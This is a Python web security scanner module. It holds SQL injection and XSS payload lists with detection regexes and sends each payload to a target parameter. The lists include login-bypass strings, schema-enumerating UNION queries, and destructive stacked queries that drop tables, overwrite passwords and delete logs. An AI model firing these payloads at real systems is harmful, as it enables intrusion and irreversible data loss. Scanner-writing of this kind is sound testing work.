import re
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum


class SQLInjectionType(Enum):
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    STACKED_QUERIES = "stacked_queries"
    AUTH_BYPASS = "auth_bypass"
    BLIND = "blind"


class XSSInjectionType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"
    EVENT_HANDLER = "event_handler"
    JAVASCRIPT_PROTOCOL = "javascript_protocol"
    HTML5 = "html5"


@dataclass
class SecurityFinding:
    vulnerability_type: str
    sub_type: str
    severity: str
    confidence: float
    description: str
    payload: str
    evidence: str
    affected_param: str
    location: str = 'body'
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'vulnerability_type': self.vulnerability_type,
            'sub_type': self.sub_type,
            'severity': self.severity,
            'confidence': self.confidence,
            'description': self.description,
            'payload': self.payload,
            'evidence': self.evidence,
            'affected_param': self.affected_param,
            'location': self.location
        }


class SQLInjectionTester:
    def __init__(self):
        self.error_patterns = self._compile_error_patterns()
        self.payloads = self._generate_payloads()
    
    def _compile_error_patterns(self) -> Dict[str, re.Pattern]:
        patterns = {
            'mysql': re.compile(r'(MySQL|Syntax error|1064|1146|1054|1062|Error in query|near \')', re.IGNORECASE),
            'postgresql': re.compile(r'(PostgreSQL|PG::|syntax error at|relation ".*" does not exist|column ".*" does not exist)', re.IGNORECASE),
            'mssql': re.compile(r'(Microsoft SQL Server|Msg \d+, Level \d+, State \d+|Unclosed quotation mark|Invalid column name)', re.IGNORECASE),
            'oracle': re.compile(r'(ORA-\d+|PL/SQL|TNS:|invalid identifier|table or view does not exist)', re.IGNORECASE),
            'sqlite': re.compile(r'(SQLite|sqlite3|OperationalError|ProgrammingError|near ".*": syntax error)', re.IGNORECASE),
            'generic': re.compile(r'(database error|sql syntax|query failed|invalid query|unclosed quotation|unterminated string)', re.IGNORECASE)
        }
        return patterns
    
    def _generate_payloads(self) -> Dict[SQLInjectionType, List[str]]:
        return {
            SQLInjectionType.ERROR_BASED: [
                "'",
                "''",
                "'\"'",
                "')",
                "'))",
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' UNION SELECT 1,2,3--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=CAST((SELECT version()) AS int)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT VERSION())))--",
                "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT VERSION())), 1)--",
            ],
            SQLInjectionType.UNION_BASED: [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT version(),user(),database()--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "' UNION ALL SELECT 1,2,3--",
            ],
            SQLInjectionType.BOOLEAN_BASED: [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(0)='",
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND 'x'='x",
                "' AND 'x'='y",
            ],
            SQLInjectionType.TIME_BASED: [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)='",
                "1'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                "' AND pg_sleep(5) IS NULL--",
            ],
            SQLInjectionType.AUTH_BYPASS: [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 'a'='a",
                "admin' --",
                "admin' #",
                "' UNION SELECT 'admin' as username--",
            ],
            SQLInjectionType.STACKED_QUERIES: [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker', 'pass')--",
                "'; UPDATE users SET password='hacked'--",
                "1'; DELETE FROM logs WHERE 1=1--",
            ]
        }
    
    def get_payloads_for_test(self, test_type: Optional[SQLInjectionType] = None) -> List[Tuple[str, str]]:
        if test_type:
            return [(p, test_type.value) for p in self.payloads.get(test_type, [])]
        
        all_payloads = []
        for inj_type, payload_list in self.payloads.items():
            all_payloads.extend([(p, inj_type.value) for p in payload_list])
        return all_payloads
    
    def detect_sqli(self, response_data: Dict[str, Any], payload: str) -> List[SecurityFinding]:
        findings = []
        response_body = str(response_data.get('response_body', ''))
        status_code = response_data.get('status_code', 200)
        response_time = response_data.get('response_time', 0)
        
        detected_databases = []
        for db_type, pattern in self.error_patterns.items():
            if pattern.search(response_body):
                detected_databases.append(db_type)
        
        if detected_databases:
            findings.append(SecurityFinding(
                vulnerability_type='sql_injection',
                sub_type='error_based',
                severity='high',
                confidence=0.9,
                description=f'SQL error messages detected in response: {", ".join(detected_databases)}',
                payload=payload,
                evidence=response_body[:200],
                affected_param=response_data.get('tested_param', 'unknown'),
                location=response_data.get('param_location', 'body')
            ))
        
        if response_time >= 5000:
            findings.append(SecurityFinding(
                vulnerability_type='sql_injection',
                sub_type='time_based',
                severity='high',
                confidence=0.7,
                description=f'Possible time-based SQL injection - response time: {response_time}ms',
                payload=payload,
                evidence=f'Response time: {response_time}ms',
                affected_param=response_data.get('tested_param', 'unknown'),
                location=response_data.get('param_location', 'body')
            ))
        
        if status_code == 500 and len(response_body) > 100:
            findings.append(SecurityFinding(
                vulnerability_type='sql_injection',
                sub_type='error_based',
                severity='medium',
                confidence=0.5,
                description='Server error 500 with SQL injection payload',
                payload=payload,
                evidence=f'Status: {status_code}, Body length: {len(response_body)}',
                affected_param=response_data.get('tested_param', 'unknown'),
                location=response_data.get('param_location', 'body')
            ))
        
        return findings


class XSSTester:
    def __init__(self):
        self.xss_patterns = self._compile_xss_patterns()
        self.payloads = self._generate_payloads()
    
    def _compile_xss_patterns(self) -> Dict[str, re.Pattern]:
        return {
            'script_tags': re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),
            'event_handlers': re.compile(r'\son\w+\s*=', re.IGNORECASE),
            'javascript_protocol': re.compile(r'javascript:', re.IGNORECASE),
            'html_tags': re.compile(r'<(svg|iframe|img|input|body|div|a)[^>]*>', re.IGNORECASE),
            'expression': re.compile(r'expression\s*\(', re.IGNORECASE),
            'eval_call': re.compile(r'eval\s*\(', re.IGNORECASE),
            'alert_box': re.compile(r'alert\s*\(', re.IGNORECASE),
            'prompt_box': re.compile(r'prompt\s*\(', re.IGNORECASE),
            'confirm_box': re.compile(r'confirm\s*\(', re.IGNORECASE),
            'data_protocol': re.compile(r'data:text/html', re.IGNORECASE),
            'vbscript_protocol': re.compile(r'vbscript:', re.IGNORECASE)
        }
    
    def _generate_payloads(self) -> Dict[XSSInjectionType, List[str]]:
        return {
            XSSInjectionType.REFLECTED: [
                '<script>alert(1)</script>',
                '<script>prompt(1)</script>',
                '<script>confirm(1)</script>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe onload=alert(1)></iframe>',
            ],
            XSSInjectionType.EVENT_HANDLER: [
                '" onmouseover="alert(1)" x="',
                "' onmouseover='alert(1)' x='",
                '" onclick="alert(1)" x="',
                '" onfocus="alert(1)" autofocus x="',
                '" onload="alert(1)" x="',
                '" onerror="alert(1)" src=x x="',
                '" oninput="alert(1)" x="',
            ],
            XSSInjectionType.JAVASCRIPT_PROTOCOL: [
                'javascript:alert(1)',
                'javascript:alert`1`',
                'jAvAsCrIpT:alert(1)',
                'java\x00script:alert(1)',
            ],
            XSSInjectionType.HTML5: [
                '<details ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<body onload=alert(1)>',
                '<form action="javascript:alert(1)"><input type=submit>',
                '<button onclick="alert(1)">',
            ],
            XSSInjectionType.DOM: [
                '"><img src=x onerror=alert(1)>"',
                '\');alert(1);//',
                '"+alert(1)+"',
                '${alert(1)}',
                '{{7*7}}',
            ]
        }
    
    def get_payloads_for_test(self, test_type: Optional[XSSInjectionType] = None) -> List[Tuple[str, str]]:
        if test_type:
            return [(p, test_type.value) for p in self.payloads.get(test_type, [])]
        
        all_payloads = []
        for inj_type, payload_list in self.payloads.items():
            all_payloads.extend([(p, inj_type.value) for p in payload_list])
        return all_payloads
    
    def detect_xss(self, response_data: Dict[str, Any], payload: str) -> List[SecurityFinding]:
        findings = []
        response_body = str(response_data.get('response_body', ''))
        content_type = response_data.get('response_headers', {}).get('Content-Type', '')
        
        reflected_patterns = []
        for pattern_name, pattern in self.xss_patterns.items():
            if pattern.search(response_body):
                reflected_patterns.append(pattern_name)
        
        if payload in response_body:
            if 'text/html' in content_type:
                confidence = 0.9
            elif 'application/json' in content_type:
                confidence = 0.6
            else:
                confidence = 0.7
            
            severity = 'high' if 'text/html' in content_type else 'medium'
            
            findings.append(SecurityFinding(
                vulnerability_type='xss',
                sub_type='reflected',
                severity=severity,
                confidence=confidence,
                description=f'XSS payload reflected in response. Detected patterns: {", ".join(reflected_patterns)}',
                payload=payload,
                evidence=f'Payload found in response: {payload}',
                affected_param=response_data.get('tested_param', 'unknown'),
                location=response_data.get('param_location', 'body')
            ))
        
        if 'X-XSS-Protection' not in response_data.get('response_headers', {}):
            findings.append(SecurityFinding(
                vulnerability_type='security_header_missing',
                sub_type='xss_protection',
                severity='low',
                confidence=1.0,
                description='X-XSS-Protection header is missing',
                payload='N/A',
                evidence='X-XSS-Protection header not found',
                affected_param='headers',
                location='headers'
            ))
        
        csp_header = response_data.get('response_headers', {}).get('Content-Security-Policy', '')
        if not csp_header:
            findings.append(SecurityFinding(
                vulnerability_type='security_header_missing',
                sub_type='csp',
                severity='low',
                confidence=1.0,
                description='Content-Security-Policy header is missing',
                payload='N/A',
                evidence='Content-Security-Policy header not found',
                affected_param='headers',
                location='headers'
            ))
        
        return findings


class SecurityScanner:
    def __init__(self):
        self.sqli_tester = SQLInjectionTester()
        self.xss_tester = XSSTester()
        self.findings: List[SecurityFinding] = []
    
    def run_security_scan(
        self,
        param_name: str,
        param_location: str,
        run_request_func
    ) -> Dict[str, Any]:
        all_findings = []
        
        sqli_payloads = self.sqli_tester.get_payloads_for_test()
        for payload, payload_type in sqli_payloads:
            result = run_request_func(param_name, payload, param_location)
            findings = self.sqli_tester.detect_sqli(result, payload)
            for finding in findings:
                finding.sub_type = payload_type
                finding.location = param_location
            all_findings.extend(findings)
        
        xss_payloads = self.xss_tester.get_payloads_for_test()
        for payload, payload_type in xss_payloads:
            result = run_request_func(param_name, payload, param_location)
            findings = self.xss_tester.detect_xss(result, payload)
            for finding in findings:
                finding.sub_type = payload_type
                finding.location = param_location
            all_findings.extend(findings)
        
        self.findings.extend(all_findings)
        
        return {
            'total_tests': len(sqli_payloads) + len(xss_payloads),
            'sqli_tests': len(sqli_payloads),
            'xss_tests': len(xss_payloads),
            'findings_count': len(all_findings),
            'findings': [f.to_dict() for f in all_findings],
            'critical_findings': sum(1 for f in all_findings if f.severity == 'high'),
            'medium_findings': sum(1 for f in all_findings if f.severity == 'medium'),
            'low_findings': sum(1 for f in all_findings if f.severity == 'low')
        }
    
    def get_security_report(self) -> Dict[str, Any]:
        critical = sum(1 for f in self.findings if f.severity == 'high')
        medium = sum(1 for f in self.findings if f.severity == 'medium')
        low = sum(1 for f in self.findings if f.severity == 'low')
        
        sqli_findings = [f for f in self.findings if f.vulnerability_type == 'sql_injection']
        xss_findings = [f for f in self.findings if f.vulnerability_type == 'xss']
        header_findings = [f for f in self.findings if 'header' in f.vulnerability_type]
        
        overall_risk = 'high' if critical > 0 else 'medium' if medium > 0 else 'low' if low > 0 else 'none'
        
        return {
            'overall_risk': overall_risk,
            'total_findings': len(self.findings),
            'by_severity': {
                'critical': critical,
                'medium': medium,
                'low': low
            },
            'by_type': {
                'sql_injection': len(sqli_findings),
                'xss': len(xss_findings),
                'security_headers': len(header_findings)
            },
            'findings': [f.to_dict() for f in self.findings],
            'top_findings': [f.to_dict() for f in sorted(self.findings, 
                key=lambda x: {'high': 0, 'medium': 1, 'low': 2}.get(x.severity, 3))[:10]]
        }
    
    def clear(self) -> None:
        self.findings.clear()
